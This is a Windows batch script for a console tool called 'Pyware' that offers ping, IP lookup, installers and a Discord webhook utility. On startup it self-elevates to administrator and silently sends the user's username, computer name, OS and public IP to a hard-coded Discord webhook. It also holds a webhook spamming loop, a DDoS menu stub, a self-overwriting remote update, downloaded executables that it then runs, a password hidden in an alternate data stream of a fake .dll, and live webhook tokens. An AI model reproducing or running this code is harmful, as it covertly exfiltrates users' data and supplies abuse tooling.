@echo off
REM   ___                                      
REM  (  _ \                                          
REM  | |_) )_   _ _   _   _   _ _ _ __   __    
REM  |  __/( ) ( ) ) ( ) ( )/ _  )  __)/ __ \        
REM  | |   | (_) | \_/ \_/ | (_| | |  (  ___/        
REM  (_)    \__  |\__/\___/ \__ _)_)   \____)        
REM        ( )_| |                                   
REM         \___/   
REM  Copyright © Pyware 2021. All Rights Reserved.

:: ----------- Config ----------- ::

title Loading Pyware . . . 
if not exist %appdata%\Pyware\ goto pywarefilesdownload
if not exist %appdata%\Pyware\paping goto pywarefilesdownload

:config
chcp 65001 >nul
cd %appdata%\Pyware\ >nul
mode con lines=33 cols=80 >nul
SETLOCAL EnableDelayedExpansion >nul
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
if exist "%appdata%\Pyware\4BzIoO0Fdu.dll" goto passwd
goto variables
:passwd
certutil -decode %appdata%\Pyware\4BzIoO0Fdu.dll:23948429348.pyware %appdata%\Pyware\outpass.pyware
for /f "delims=" %%x in (%appdata%\Pyware\outpass.pyware) do set Build=%%x
del %appdata%\Pyware\outpass.pyware >nul
cls
set "psCommand=powershell -Command "$pword = read-host 'Enter Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set password=%%p
if %password% == %Build% goto variables
echo Incorrect Password.
timeout 2 >nul
goto passwd

:: ----------- Variables ----------- ::

:variables
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
for /f %%a in ('powershell Invoke-RestMethod api64.ipify.org') do set PublicIPV6=%%a
set LoginLOG=https://discord.com/api/webhooks/899201532992561202/DI-cX4ff1sPetnHtis9S1RLvhowjjzsRZTLWrUxvfjueAwALXIpmRYlKdW4JBqJhCUni
set DDoSLOG=https://discord.com/api/webhooks/899870530419703868/4zq84JKbIqgqz42U6Rj1ZAG8T1_aMmSnAfcHA1ROOtEHMc8ftnMlpzHVSx5q1qaSXQ63
set filepath=%~f0
set user=root
curl --silent -X POST -H "Content-type: application/json" --data ^
 "{\"content\":  \"```^
 New user login info : %DATE% : %TIME%\n \nAccount Name: %user%\n\nUsername: %USERNAME%\n\nIP Address: %PublicIP%^
 \n\nPC Name: %COMPUTERNAME%\n\nOS: %OS%\n\nProccesorStructure: %PROCESSOR_ARCHITECTURE%```\n\"}" %LoginLOG%
goto console
for /f "tokens=5 delims= " %%a in ('vol c: ^| Find "Serial Number"') do (
set VOLSERIAL=%%a
)
:: ----------- Main ----------- ::

:console
cls
title Pyware Console [Version 0.1]
mode con lines=33 cols=80 >nul
set input= 
echo [38;2;255;255;255mPyware Console [Version 0.0]
echo (c) Pyware. All rights reserved.
echo.
goto consoleinput

:consoleinput
set input= 
set /p input= [38;2;255;255;255m%USERNAME%@%user% ~ $ 
set ipli=%input:~4,32%
set pip=%input:~5,32%
set dip=%input:~5,32%
set cmd=%input:~4,32%
set ps=%input:~3,32%
set color=%input:~6,32%
set title=%input:~6,32%
set ppi=%input:~6,32%
set ppp=%input:~17,32%
if ["%input%"] == ["help"] goto help REM Opens the help page.
if ["%input%"] == ["cmd %cmd%"] goto cmd
if ["%input%"] == ["ps %ps%"] goto ps
if ["%input%"] == ["pwd"] goto pwd
if ["%input%"] == ["ping %pip%"] goto ping REM Pings an external IP.
if ["%input%"] == ["title %title%"] goto title REM Sets the window title for a Pyware.exe session.
if ["%input%"] == ["title reset"] goto titlereset
if ["%input%"] == ["webem"] goto webem
if ["%input%"] == ["pping %ppi%"] goto pping REM  Pings an external IP with TCP port. (Not Finished)
if ["%input%"] == ["ddos %dip%"] goto ddos REM  Redirects you to a DDosing Console. (Not Finished)
if ["%input%"] == ["ipl %ipli%"] goto iplookup REM  Looks up approximate data for an external IP. (Not Finished)
if ["%input%"] == ["ipinfo"] goto ipinfo REM  Info about you're External IP, IPV4, and IPV6.
if ["%input%"] == ["ipconfig"] goto ipinfo REM  Info about External IP, IPV4, and IPV6.
if ["%input%"] == ["ipconfiguration"] goto ipinfo REM  Info about External IP, IPV4, and IPV6.
if ["%input%"] == ["credits"] goto credits REM  Rediects you to a page that shows people who helped develeped Pyware. 
if ["%input%"] == ["clear"] goto console REM  Clears all previous commands.
if ["%input%"] == ["cls"] goto console REM  Clears all previous commands.
if ["%input%"] == ["update"] goto update REM  Updates Pyware Console to the latest and stable version. (Not Finished)
if ["%input%"] == ["fixpyware"] goto fixpyware
if ["%input%"] == ["python"] goto python
if ["%input%"] == ["node"] goto node
if ["%input%"] == [""] goto consoleinput
if ["%input%"] == [" "] goto consoleinput
if ["%input%"] == ["  "] goto consoleinput
if ["%input%"] == ["   "] goto consoleinput
if ["%input%"] == ["    "] goto consoleinput
if ["%input%"] == ["     "] goto consoleinput
if ["%input%"] == ["      "] goto consoleinput
if ["%input%"] == ["       "] goto consoleinput
if ["%input%"] == ["        "] goto consoleinput
if ["%input%"] == ["         "] goto consoleinput
if ["%input%"] == ["          "] goto consoleinput
if ["%input%"] == ["           "] goto consoleinput
if ["%input%"] == ["            "] goto consoleinput
if ["%input%"] == ["             "] goto consoleinput
if ["%input%"] == ["              "] goto consoleinput
if ["%input%"] == ["               "] goto consoleinput
if ["%input%"] == ["                "] goto consoleinput
if ["%input%"] == ["exit"] exit
if ["%input%"] == ["x"] exit


:invalid
echo [38;2;0;255;255m
echo  
echo '%input%' is not recognized as an internal or external command.
echo.
goto consoleinput


:ping
echo [38;2;0;255;255m
set ip=%input:~5,32%
ping %ip% -n 3
echo.
goto consoleinput


:: ----------- paping ----------- ::
:pping
echo [38;2;0;255;255m
set /p ppp= Port: 
paping.exe %ppi% -p %ppp% -c 3
echo.
goto consoleinput
:: ----------- paping ----------- ::


:help
mode con lines=44 cols=100 >nul
echo. [38;2;0;255;255m
echo   ping ^<ip^>                 Pings an external IP.
echo.
echo   pping ^<ip^> ^<port^>         Pings an external IP with TCP port.
echo.
echo   ddos ^<ip^>                 "downing routers like 9/11" -py
echo.
echo   ipl ^<ip^>                  Looks up approximate data for an external IP.
echo.
echo   ipinfo                    Info about you're External IP, IPV4, and IPV6.
echo.
echo   credits                   Rediects you to a page that shows people who helped develeped Solar.
echo.
echo   webem                     Redirects you to a discord webhook configuration application.
echo.
echo   update                    Updates Solar to the latest and stable version.
echo.
echo   title                     Sets the window title for a Pyware.exe session.
echo.
echo   python                    Redirects you to Python Terminal (Latest Version of Python Required)
echo.
echo   rules                     asfjpsfjmpasfopmfomsd
echo.
echo   node                      Rediects you to Node.js Terminal (Latest Version of Node.js Required)
echo.
echo   cmd ^<command^>             Runs a Windows Command Prompt Command.
echo.
echo   ps ^<command^>              Runs a Windows Powershell Command.
echo.
echo   pwd                       Sets a password for Pyware.
echo.
echo   ipinfo                    Info about you're External IP, IPV4, and IPV6.
echo.
echo   clear                     Clears all previous commands.
echo.
echo.
echo   For more information, visit pyware.xyz
echo.
echo.
goto consoleinput

:: ----------- title ----------- ::
:title
echo [38;2;0;255;255m
title %title%
echo.
goto consoleinput

:titlereset
echo [38;2;0;255;255m
title Pyware Console [V 0.1]
echo.
goto consoleinput
:: ----------- title ----------- ::


:: ----------- webem ----------- ::

:webem
cls
title Webem
echo.
echo                             ╔╗╔╗╔╗    ╔╗          
echo                             ║║║║║║    ║║          
echo                             ║║║║║║╔══╗║╚═╗╔══╗╔╗╔╗
echo                             ║╚╝╚╝║║╔╗║║╔╗║║╔╗║║╚╝║
echo                             ╚╗╔╗╔╝║║═╣║╚╝║║║═╣║║║║
echo                              ╚╝╚╝ ╚══╝╚══╝╚══╝╚╩╩╝
echo.                                       
echo.
echo                             [ 1 - New Webhook    ]
echo                             [ 2 - Delete Webhook ]
echo                             [ 3 - Spammer        ]
echo                             [ x - Back to pyware ]
echo.
set /p input= Input: 
if ["%input%"] == ["1"] goto new
if ["%input%"] == ["2"] goto delwebhook
if ["%input%"] == ["3"] goto webspam
if ["%input%"] == ["x"] goto console

:new
cls
set /p WebURL= Webhook URL: 
set /p Webname= Webhook Name: 
cls
:inputN
set /p say= Input: 
if ["%say%"] == ["webhook stop"] goto webem
set newweb=%WebURL%
curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%say%\"}" ^
  %newweb%
goto inputN

:delwebhook
cls
set /p WebURL= Webhook URL: 
CURL -X "DELETE" %WebURL%
goto webem

:webspam
cls
set /p WebURL= Webhook URL: 
set /p Webname= Webhook Name: 
set /p WebCon= Content: 
timeout 2 >nul
goto webspam1
:webspam1
curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 3 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
  timeout 1 >nul
  curl ^
  -H "Content-Type: application/json" ^
  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
  %WebURL%
goto webspam1

:: ----------- webem ----------- ::


:: ----------- update ----------- ::
:update
echo [38;2;0;255;255m
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/SFjOPAFJoANosfnioadCNM/main/Pyware.bat -Outfile %filepath%"
echo.
echo Successfully updated Pyware to the latest and stable version.
echo.
goto consoleinput
:: ----------- update ----------- ::


:ddos
cls
echo POWERED BY HYDROAPI (OWNED BY PY)
echo                          ╔═╗╦ ╦╦ ╦╔═╗╦═╗╔═╗
echo                          ╠═╝╚╦╝║║║╠═╣╠╦╝║╣ 
echo                          ╩   ╩ ╚╩╝╩ ╩╩╚═╚═╝
echo			     [+]════════════════════[+]═══════════════════[+]
echo            ║                      ║                     ║
echo            ║                      ║                     ║
echo            ║                      ║                     ║
echo            ║                      ║                     ║
echo           [+]════════════════════[+]═══════════════════[+]
timeout 3 >nul
pause >nul
goto main


:: ----------- IPLookup ----------- ::
:iplookup
echo [38;2;0;255;255m
set IP=%input:~4,32%
goto action
:input
:action
if '%IP%'=='1.1.1.1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
if '%IP%'=='127.0.0.1' echo sUrl = "http://ipinfo.io/json" > %temp%\%webclient%.vbs & goto localip
goto iplookup
goto input
:iplookup
echo sUrl = "http://ipinfo.io/%IP%/json" > %temp%\%webclient%.vbs
:localip
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
rem echo Msgbox HTTPGET,vbSystemModal+vbOKOnly+vbInformation, "IP Info" >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
echo.
rem echo Waiting for API response. . .
echo  Looking up IP Address. . .
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
goto consoleinput
:response_exist
echo.
for /f "delims= 	" %%i in ('findstr /i "ip hostname city region country loc org postal" %temp%\response.txt') do (
	set data=%%i
	set data=!data:,=!
	set data=!data:""=Not Listed!
	set data=!data:"=!
	set data=!data:ip:=[38;2;0;255;255mIP:		!
	set data=!data:hostname:=[40;36mHostname:	!
	set data=!data:city:=[40;36mCity:		!
	set data=!data:region:=[40;36mState:	!
	set data=!data:country:=[40;36mCountry:	!
	set data=!data:loc:=[40;36mLocation:	!
	set data=!data:org:=[40;36mISP:		!
	set data=!data:postal:=[40;36mPostal:	!
	echo [40;36m!data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
goto consoleinput
:: ----------- IPLookup ----------- ::


:ipinfo
echo [38;2;0;255;255m
ipconfig | find /i "IPV4"
echo.
ipconfig | find /i "IPV6"
echo.
echo    External IPV4 . . . . . . . . . . : %PublicIP%
echo.
echo    External IPV6 . . . . . . . . . . : %PublicIPV6%
echo.
goto consoleinput


:credits
echo [38;2;0;255;255m
echo              [+]══════════════════[+]═════════════════[+]
echo               ║        Pythoral - Main Developer       ║
echo               ║        Duelawig - Main Developer       ║
echo              [+]══════════════════[+]═════════════════[+]
echo.
goto consoleinput


:: ----------- python ----------- ::
:python
echo [1;38;2;0;255;255m
if not exist "C:\Python310" goto pyinstall
python
goto consoleinput
:pyinstall
cls
echo.
echo Python is not installed on this machine, would you like to install it?
echo.
set /p py= Choice(Y/N): 
if %py% == Yes goto pyyes
if %py% == No goto pyno
if %py% == yes goto pyyes
if %py% == no goto pyno
if %py% == y goto pyyes
if %py% == n goto pyno
if %py% == Y goto pyyes
if %py% == N goto pyno
echo  
echo '%py%' is not a valid choice.
goto nodeinstall
:pyyes
mkdir %temp%\Pyware\
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Started Download for Python', 'Pyware', [System.Windows.Forms.ToolTipIcon]::None)}"
bitsadmin /transfer Python /download /priority foreground "https://github.com/AA206yt/SFjOPAFJoANosfnioadCNM/raw/main/python.zip" "%temp%\Pyware\Python.zip"
powershell Expand-Archive %temp%\Pyware\python.zip -DestinationPath %temp%\Pyware\ >nul
start %temp%\Pyware\python-3.10.1-amd64.exe
cls
goto console

:pyno
echo.
goto consoleinput
:: ----------- python ----------- ::

:: ----------- node.js ----------- ::
:node
echo [1;38;2;0;255;255m
if not exist "C:\Program Files\nodejs" goto nodeinstall
node
goto consoleinput
:nodeinstall
cls
echo.
echo Node.js is not installed on this machine, would you like to install it?
echo.
set /p node= Choice(Y/N): 
if %node% == Yes goto nodeyes
if %node% == No goto nodeno
if %node% == yes goto nodeyes
if %node% == no goto nodeno
if %node% == y goto nodeyes
if %node% == n goto nodeno
if %node% == Y goto nodeyes
if %node% == N goto nodeno
echo  
echo '%node%' is not a valid choice.
goto nodeinstall
:nodeyes
mkdir %temp%\Pyware\
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Started Download for Node', 'Pyware', [System.Windows.Forms.ToolTipIcon]::None)}"
bitsadmin /transfer Node.js /download /priority foreground "https://github.com/AA206yt/SFjOPAFJoANosfnioadCNM/raw/main/node.zip" "%appdata%\Pyware\node.zip"
powershell Expand-Archive %appdata%\Pyware\node.zip -DestinationPath %appdata%\Pyware\ >nul
start node.msi
cls
goto console

:nodeno
echo.
goto consoleinput
:: ----------- node.js ----------- ::

:: ----------- cmd ----------- ::
:cmd
echo [38;2;0;255;255m
mode con lines=44 cols=100 >nul
%cmd%
echo.
goto consoleinput
:: ----------- cmd ----------- ::

:: ----------- powershell ----------- ::
:ps
echo [38;2;0;255;255m
powershell %ps%
goto consoleinput
:: ----------- powershell ----------- ::

:: ----------- password ----------- ::

:pwd
echo [38;2;0;255;255m
cls
set "psCommand=powershell -Command "$pword = read-host 'Enter New Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set newpass=%%p
echo.
set "psCommand=powershell -Command "$pword = read-host 'Confirm New Password' -AsSecureString ; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
        [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)""
for /f "usebackq delims=" %%p in (`%psCommand%`) do set newpass1=%%p
if %newpass1% == %newpass% goto didsetpass
echo.
echo  
echo Passwords do not match. & timeout 2 >nul & goto pwd
:didsetpass
mkdir %temp%\Pyware\
echo %newpass% > %temp%\Pyware\pywarepass.pyware
echo function == {true} > %appdata%\Pyware\4BzIoO0Fdu.dll >nul
certutil -encode %temp%\Pyware\pywarepass.pyware %temp%\Pyware\23948429348.pyware >nul
type %temp%\Pyware\23948429348.pyware > %appdata%\Pyware\4BzIoO0Fdu.dll:23948429348.pyware
del %temp%\Pyware\23948429348.pyware >nul
del %temp%\Pyware\pywarepass.pyware >nul
cls
echo.
echo [40;36mSuccessfully updated password.
timeout 2 >nul
goto console

:: ----------- password ----------- ::

:pywarefilesdownload
echo [38;2;0;255;255m
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Thank you for using Pyware', 'Pyware', [System.Windows.Forms.ToolTipIcon]::None)}"
cd %appdata% >nul
mkdir Pyware >nul
cd %appdata%\Pyware\ >nul
if not exist %appdata%\Pyware\paping.exe bitsadmin /transfer paping.exe /download /priority foreground "https://github.com/AA206yt/Pyware/raw/main/paping.exe" "%appdata%\Pyware\paping.exe"
goto config
